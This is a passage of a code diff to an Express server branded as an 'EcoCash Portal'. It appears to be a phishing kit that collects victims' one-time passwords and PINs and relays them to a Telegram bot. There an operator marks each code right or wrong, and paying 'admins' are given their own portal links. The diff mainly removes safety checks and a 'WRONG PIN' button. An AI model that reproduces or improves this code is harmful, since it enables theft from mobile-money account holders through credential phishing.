@@ -3,9 +3,7 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
-
-// Safe fetch loader (supports both native Node fetch and node-fetch package)
-const fetch = global.fetch || (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+const fetch = require('node-fetch');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -16,7 +14,7 @@ app.use(express.json());
 const publicPath = path.join(__dirname, 'public');
 app.use(express.static(publicPath));
 
-// Persistent storage file path safely managed for cloud environments
+// Persistent storage file path
 const STORAGE_FILE = path.join(__dirname, 'admins_data.json');
 
 // Load initial data from disk if it exists
@@ -33,7 +31,7 @@ function loadPersistentData() {
       };
     }
   } catch (err) {
-    console.error("Notice: Starting with fresh persistent maps (storage load skipped):", err.message);
+    console.error("Error loading persistent data:", err);
   }
   return {
     authorizedUsers: new Map(),
@@ -54,7 +52,7 @@ function savePersistentData() {
     };
     fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
   } catch (err) {
-    console.error("Notice: Disk write skipped (read-only environment):", err.message);
+    console.error("Error saving persistent data:", err);
   }
 }
 
@@ -186,9 +184,6 @@ app.post('/api/submit-otp', async (req, res) => {
             [
               { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
               { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
-            ],
-            [
-              { text: '❌ WRONG PIN', callback_data: `pin_wrong_${appReference}` }
             ]
           ]
         })
@@ -243,7 +238,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       const userStatus = authorizedUsers.get(userId);
 
       // Main Admin check
-      if (masterChatId && chatId === masterChatId.toString()) {
+      if (chatId === masterChatId.toString()) {
         authorizedUsers.set(userId, 'PAID');
         const mainPath = '/Admin-0001';
         pathToAdminChat.set(mainPath, chatId);
@@ -304,32 +299,30 @@ app.post('/api/telegram-webhook', async (req, res) => {
       authorizedUsers.set(userId, 'PENDING');
       savePersistentData();
 
-      if (masterChatId) {
-        const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
-                               `🆔 <b>ID:</b> <code>${userId}</code>\n` +
-                               `👤 <b>Name:</b> ${fullName}\n` +
-                               `🏷 <b>Username:</b> ${username}\n` +
-                               `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
-                               `👇 <b>Select Access Status for this User:</b>`;
+      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
+                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +
+                             `👤 <b>Name:</b> ${fullName}\n` +
+                             `🏷 <b>Username:</b> ${username}\n` +
+                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
+                             `👇 <b>Select Access Status for this User:</b>`;
 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: masterChatId,
-            text: adminAlertText,
-            parse_mode: 'HTML',
-            reply_markup: JSON.stringify({
-              inline_keyboard: [
-                [
-                  { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
-                  { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
-                ]
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: masterChatId,
+          text: adminAlertText,
+          parse_mode: 'HTML',
+          reply_markup: JSON.stringify({
+            inline_keyboard: [
+              [
+                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
+                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
               ]
-            })
+            ]
           })
-        });
-      }
+        })
+      });
 
       const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
                               `Your access request has been sent to the main administrator for review.\n\n` +
@@ -352,7 +345,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
   const messageId = callback_query.message.message_id;
 
   if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
-    if (!masterChatId || chatId !== masterChatId.toString()) {
+    if (chatId !== masterChatId.toString()) {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -494,4 +487,21 @@ app.get('/Admin-*', (req, res) => {
       <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-md p-8 text-center space-y-4">
         <div class="text-4xl">⚠️</div>
         <h1 class="text-2xl font-extrabold text-red-600">Unauthorized Portal Link</h1>
-        <p class="text-sm text-slate-600">This portal link is not
+        <p class="text-sm text-slate-600">This portal link is not yet authorized or mapped to an active account.</p>
+      </div>
+    </body>
+    </html>
+  `);
+});
+
+app.get('*', (req, res) => {
+  res.status(404).send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Page Not Found - EcoCash Portal</title>
+      <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-blue-50/50 flex flex-col items-c
